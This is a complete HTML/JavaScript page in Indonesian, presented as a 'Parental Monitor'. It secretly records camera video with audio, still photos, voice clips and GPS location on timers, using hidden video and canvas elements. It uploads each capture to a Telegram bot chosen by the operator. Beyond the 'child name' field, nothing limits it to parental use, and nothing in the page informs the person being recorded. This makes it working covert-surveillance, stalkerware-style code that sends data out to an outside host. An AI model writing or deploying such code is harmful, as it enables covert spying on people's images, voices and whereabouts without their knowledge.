<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Parental Monitor - Complete</title>
    <style>
        body {
            background: #000;
            font-family: monospace;
            color: #0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            margin: 0 auto;
            background: #111;
            border: 2px solid #0f0;
            border-radius: 15px;
            padding: 20px;
        }
        label {
            display: block;
            margin-top: 12px;
            margin-bottom: 5px;
            color: #ffaa00;
        }
        input, button {
            width: 100%;
            padding: 12px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: monospace;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            background: #1a3a1a;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }
        button:hover {
            background: #2a6a2a;
        }
        .status {
            background: #001000;
            padding: 12px;
            margin-top: 15px;
            font-size: 11px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 280px;
            overflow-y: auto;
            border-left: 3px solid #0f0;
        }
        .info {
            background: #1a1a00;
            padding: 10px;
            font-size: 10px;
            margin-top: 10px;
            color: #ffff88;
        }
        video, canvas {
            display: none;
        }
        .config-panel {
            background: #0a2a0a;
            padding: 10px;
            margin-top: 10px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
<div class="container">
    <h2 style="text-align:center;">🔒 PARENTAL MONITOR (VIDEO+SUARA+FOTO+LOKASI)</h2>
    
    <label>📌 TOKEN TELEGRAM BOT:</label>
    <input type="text" id="tokenInput" placeholder="8098765432:AAHabcdefghijklmnopqrstuvwxyz">
    
    <label>📌 CHAT ID TELEGRAM ANDA:</label>
    <input type="text" id="chatIdInput" placeholder="1234567890">
    
    <label>📌 NAMA ANAK:</label>
    <input type="text" id="nameInput" placeholder="Saiful" value="Saiful">
    
    <div class="config-panel">
        <label>🎥 INTERVAL VIDEO (detik):</label>
        <input type="number" id="videoInterval" value="20" min="20" max="300">
        <label>🎥 DURASI VIDEO (detik):</label>
        <input type="number" id="videoDuration" value="19" min="5" max="60">
        <label>📍 INTERVAL LOKASI (detik):</label>
        <input type="number" id="locationInterval" value="60" min="30" max="600">
        <label>📸 INTERVAL FOTO (detik):</label>
        <input type="number" id="photoInterval" value="30" min="10" max="300">
        <label>🎤 INTERVAL VOICE (detik):</label>
        <input type="number" id="voiceInterval" value="120" min="30" max="600">
    </div>
    
    <button id="startBtn">▶ MULAI MONITORING</button>
    <button id="stopBtn" disabled>⏹️ HENTIKAN</button>
    
    <div class="status" id="logArea">[INFO] Masukkan Token dan Chat ID, lalu tekan MULAI.</div>
    <div class="info">
        🎥 VIDEO: setiap 20 detik, durasi 19 detik (DENGAN SUARA)<br>
        📸 FOTO: bisa diatur<br>
        🎤 VOICE NOTE: rekam suara 10 detik<br>
        📍 LOKASI: dipisah, bisa diatur
    </div>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="hiddenCanvas"></canvas>

<script>
    // ========== ELEMEN ==========
    const tokenInput = document.getElementById('tokenInput');
    const chatIdInput = document.getElementById('chatIdInput');
    const nameInput = document.getElementById('nameInput');
    const videoIntervalInput = document.getElementById('videoInterval');
    const videoDurationInput = document.getElementById('videoDuration');
    const locationIntervalInput = document.getElementById('locationInterval');
    const photoIntervalInput = document.getElementById('photoInterval');
    const voiceIntervalInput = document.getElementById('voiceInterval');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const logArea = document.getElementById('logArea');
    
    const hiddenVideo = document.getElementById('hiddenVideo');
    const hiddenCanvas = document.getElementById('hiddenCanvas');
    
    // ========== VARIABEL ==========
    let videoStream = null;      // untuk kamera + mic (video dengan suara)
    let audioStreamForVoice = null;  // untuk voice note terpisah
    let mediaRecorderVideo = null;
    let mediaRecorderVoice = null;
    let videoChunks = [];
    let voiceChunks = [];
    let monitoringActive = false;
    let intervals = [];
    let token = '', chatId = '', childName = '';
    let videoDurationSec = 19;
    let videoIntervalSec = 20;
    let locationIntervalSec = 60;
    let photoIntervalSec = 30;
    let voiceIntervalSec = 120;
    let isRecordingVideo = false;
    
    function addLog(msg) {
        const time = new Date().toLocaleTimeString();
        logArea.innerHTML += `\n[${time}] ${msg}`;
        logArea.scrollTop = logArea.scrollHeight;
    }
    
    // Kirim pesan teks
    async function sendTelegramMessage(text) {
        if(!token || !chatId) return false;
        try {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
            return true;
        } catch(e) {
            addLog(`❌ Gagal kirim teks: ${e.message}`);
            return false;
        }
    }
    
    // Kirim foto
    async function sendTelegramPhoto(base64Image) {
        if(!token || !chatId) return false;
        const blob = dataURLtoBlob(base64Image);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'monitor.jpg');
        formData.append('caption', `📸 ${childName} - ${new Date().toLocaleString()}`);
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
            addLog(`📸 Foto terkirim`);
            return true;
        } catch(e) {
            addLog(`❌ Gagal kirim foto`);
            return false;
        }
    }
    
    // Kirim video (dengan suara)
    async function sendTelegramVideo(videoBlob) {
        if(!token || !chatId) return false;
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', `🎥 ${childName} - Video dengan suara - ${new Date().toLocaleString()}`);
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData });
            addLog(`🎥 Video (${(videoBlob.size/1024).toFixed(0)} KB) terkirim dengan suara`);
            return true;
        } catch(e) {
            addLog(`❌ Gagal kirim video: ${e.message}`);
            return false;
        }
    }
    
    // Kirim voice note
    async function sendTelegramVoice(audioBlob) {
        if(!token || !chatId) return false;
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('voice', audioBlob, 'voice.ogg');
        formData.append('caption', `🎤 ${childName} - Rekaman suara - ${new Date().toLocaleString()}`);
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: formData });
            addLog(`🎤 Voice note terkirim`);
            return true;
        } catch(e) {
            addLog(`❌ Gagal kirim voice: ${e.message}`);
            return false;
        }
    }
    
    // Kirim lokasi
    async function sendLocation() {
        if(!monitoringActive) return;
        if(!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const link = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendTelegramMessage(`📍 ${childName}\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}\n${link}\n⏰ ${new Date().toLocaleString()}`);
            addLog(`📍 Lokasi terkirim`);
        }, () => {
            addLog(`❌ Gagal dapat lokasi`);
        });
    }
    
    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while(n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });
    }
    
    // ========== AMBIL FOTO ==========
    async function capturePhoto() {
        if(!monitoringActive) return;
        if(!hiddenVideo.videoWidth || !hiddenVideo.videoHeight) return;
        
        hiddenCanvas.width = hiddenVideo.videoWidth;
        hiddenCanvas.height = hiddenVideo.videoHeight;
        const ctx = hiddenCanvas.getContext('2d');
        ctx.drawImage(hiddenVideo, 0, 0);
        const base64 = hiddenCanvas.toDataURL('image/jpeg', 0.7);
        await sendTelegramPhoto(base64);
    }
    
    // ========== REKAM VIDEO DENGAN SUARA ==========
    async function recordVideoWithAudio() {
        if(!monitoringActive) return;
        if(!videoStream) return;
        if(isRecordingVideo) return;
        
        isRecordingVideo = true;
        videoChunks = [];
        
        // Gunakan MediaRecorder dengan video stream yang sudah include audio
        // Video stream harus dari getUserMedia dengan video AND audio
        mediaRecorderVideo = new MediaRecorder(videoStream, { mimeType: 'video/mp4' });
        mediaRecorderVideo.ondataavailable = (e) => {
            if(e.data.size > 0) videoChunks.push(e.data);
        };
        mediaRecorderVideo.onstop = async () => {
            if(videoChunks.length > 0) {
                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                if(videoBlob.size > 5000) {
                    await sendTelegramVideo(videoBlob);
                } else {
                    addLog(`⚠️ Video terlalu kecil (${videoBlob.size} bytes), tidak dikirim`);
                }
            }
            videoChunks = [];
            isRecordingVideo = false;
        };
        
        mediaRecorderVideo.start();
        addLog(`🎥 Merekam video ${videoDurationSec} detik (dengan suara)...`);
        
        setTimeout(() => {
            if(mediaRecorderVideo && mediaRecorderVideo.state === 'recording') {
                mediaRecorderVideo.stop();
                addLog(`🎥 Video selesai direkam, mengirim...`);
            }
        }, videoDurationSec * 1000);
    }
    
    // ========== REKAM VOICE NOTE ==========
    async function recordVoiceOnly() {
        if(!monitoringActive) return;
        if(!audioStreamForVoice) return;
        
        voiceChunks = [];
        if(mediaRecorderVoice && mediaRecorderVoice.state === 'recording') return;
        
        mediaRecorderVoice = new MediaRecorder(audioStreamForVoice);
        mediaRecorderVoice.ondataavailable = (e) => {
            if(e.data.size > 0) voiceChunks.push(e.data);
        };
        mediaRecorderVoice.onstop = async () => {
            if(voiceChunks.length > 0) {
                const audioBlob = new Blob(voiceChunks, { type: 'audio/ogg' });
                if(audioBlob.size > 3000) {
                    await sendTelegramVoice(audioBlob);
                }
            }
            voiceChunks = [];
        };
        
        mediaRecorderVoice.start();
        addLog(`🎤 Merekam suara 10 detik...`);
        setTimeout(() => {
            if(mediaRecorderVoice && mediaRecorderVoice.state === 'recording') {
                mediaRecorderVoice.stop();
            }
        }, 10000);
    }
    
    // ========== SETUP KAMERA + MIKROFON UNTUK VIDEO (DENGAN SUARA) ==========
    async function setupCameraAndMicrophone() {
        try {
            // Hentikan stream lama jika ada
            if(videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            if(audioStreamForVoice) {
                audioStreamForVoice.getTracks().forEach(track => track.stop());
            }
            
            // Stream untuk VIDEO + AUDIO (biar video ada suaranya)
            const videoWithAudioConstraints = {
                video: { facingMode: 'user' },
                audio: true
            };
            videoStream = await navigator.mediaDevices.getUserMedia(videoWithAudioConstraints);
            hiddenVideo.srcObject = videoStream;
            await hiddenVideo.play();
            addLog(`✅ Kamera + Mikrofon (untuk video) AKTIF - Video akan memiliki suara`);
            
            // Stream khusus untuk voice note (opsional, bisa pakai dari videoStream juga)
            // Tapi ambil stream audio terpisah untuk voice note
            const audioOnlyConstraints = { audio: true };
            audioStreamForVoice = await navigator.mediaDevices.getUserMedia(audioOnlyConstraints);
            addLog(`✅ Mikrofon untuk voice note AKTIF`);
            
            return true;
        } catch(e) {
            addLog(`❌ Gagal akses kamera/mikrofon: ${e.message}`);
            return false;
        }
    }
    
    // ========== MULAI MONITORING ==========
    async function startMonitoring() {
        token = tokenInput.value.trim();
        chatId = chatIdInput.value.trim();
        childName = nameInput.value.trim() || 'Anak';
        videoIntervalSec = parseInt(videoIntervalInput.value) || 20;
        videoDurationSec = parseInt(videoDurationInput.value) || 19;
        locationIntervalSec = parseInt(locationIntervalInput.value) || 60;
        photoIntervalSec = parseInt(photoIntervalInput.value) || 30;
        voiceIntervalSec = parseInt(voiceIntervalInput.value) || 120;
        
        if(!token || !chatId) {
            addLog(`❌ ERROR: Token dan Chat ID harus diisi!`);
            return;
        }
        
        addLog(`🔧 Memulai monitoring...`);
        addLog(`🤖 Token: ${token.substring(0,10)}...`);
        addLog(`🆔 Chat ID: ${chatId}`);
        
        // Cek koneksi Telegram
        const testResult = await sendTelegramMessage(`🚀 MONITORING DIMULAI untuk ${childName}\n⏰ ${new Date().toLocaleString()}\n\n🎥 Video: setiap ${videoIntervalSec} detik (durasi ${videoDurationSec} detik) DENGAN SUARA\n📸 Foto: setiap ${photoIntervalSec} detik\n🎤 Voice: setiap ${voiceIntervalSec} detik\n📍 Lokasi: setiap ${locationIntervalSec} detik`);
        
        if(!testResult) {
            addLog(`❌ Gagal connect ke Telegram! Periksa Token dan Chat ID.`);
            return;
        }
        
        addLog(`✅ Koneksi ke Telegram BERHASIL`);
        
        // Setup kamera dan mic
        const camOk = await setupCameraAndMicrophone();
        if(!camOk) {
            addLog(`❌ Kamera/mikrofon gagal. Pastikan izin diberikan.`);
            return;
        }
        
        monitoringActive = true;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        
        // Hapus interval lama
        intervals.forEach(id => clearInterval(id));
        intervals = [];
        
        // Mulai interval VIDEO (setiap X detik)
        intervals.push(setInterval(() => {
            if(monitoringActive) recordVideoWithAudio();
        }, videoIntervalSec * 1000));
        
        // Interval FOTO
        intervals.push(setInterval(() => {
            if(monitoringActive) capturePhoto();
        }, photoIntervalSec * 1000));
        
        // Interval VOICE NOTE
        intervals.push(setInterval(() => {
            if(monitoringActive) recordVoiceOnly();
        }, voiceIntervalSec * 1000));
        
        // Interval LOKASI (dipisah)
        intervals.push(setInterval(() => {
            if(monitoringActive) sendLocation();
        }, locationIntervalSec * 1000));
        
        // Eksekusi pertama kali
        setTimeout(() => { if(monitoringActive) recordVideoWithAudio(); }, 3000);
        setTimeout(() => { if(monitoringActive) capturePhoto(); }, 5000);
        setTimeout(() => { if(monitoringActive) recordVoiceOnly(); }, 8000);
        setTimeout(() => { if(monitoringActive) sendLocation(); }, 10000);
        
        addLog(`✅ Monitoring FULL AKTIF`);
        addLog(`🎥 Video: setiap ${videoIntervalSec} detik, durasi ${videoDurationSec} detik (DENGAN SUARA)`);
        addLog(`📍 Lokasi: setiap ${locationIntervalSec} detik (dipisah)`);
        addLog(`📸 Foto: setiap ${photoIntervalSec} detik`);
        addLog(`🎤 Voice: setiap ${voiceIntervalSec} detik`);
    }
    
    // ========== HENTIKAN ==========
    function stopMonitoring() {
        monitoringActive = false;
        intervals.forEach(id => clearInterval(id));
        intervals = [];
        
        if(mediaRecorderVideo && mediaRecorderVideo.state === 'recording') mediaRecorderVideo.stop();
        if(mediaRecorderVoice && mediaRecorderVoice.state === 'recording') mediaRecorderVoice.stop();
        
        if(videoStream) {
            videoStream.getTracks().forEach(track => track.stop());
            videoStream = null;
        }
        if(audioStreamForVoice) {
            audioStreamForVoice.getTracks().forEach(track => track.stop());
            audioStreamForVoice = null;
        }
        
        sendTelegramMessage(`🛑 MONITORING DIHENTIKAN untuk ${childName}\n⏰ ${new Date().toLocaleString()}`);
        startBtn.disabled = false;
        stopBtn.disabled = true;
        addLog(`⏹️ Monitoring dihentikan.`);
    }
    
    // Event
    startBtn.onclick = startMonitoring;
    stopBtn.onclick = stopMonitoring;
    
    // Load data tersimpan
    const savedToken = localStorage.getItem('monitor_token');
    const savedChatId = localStorage.getItem('monitor_chatid');
    const savedName = localStorage.getItem('monitor_name');
    if(savedToken) tokenInput.value = savedToken;
    if(savedChatId) chatIdInput.value = savedChatId;
    if(savedName) nameInput.value = savedName;
    
    // Simpan saat start
    const originalStart = startMonitoring;
    startMonitoring = async function() {
        localStorage.setItem('monitor_token', tokenInput.value.trim());
        localStorage.setItem('monitor_chatid', chatIdInput.value.trim());
        localStorage.setItem('monitor_name', nameInput.value.trim());
        await originalStart();
    };
    window.startMonitoring = startMonitoring;
</script>
</body>
</html>
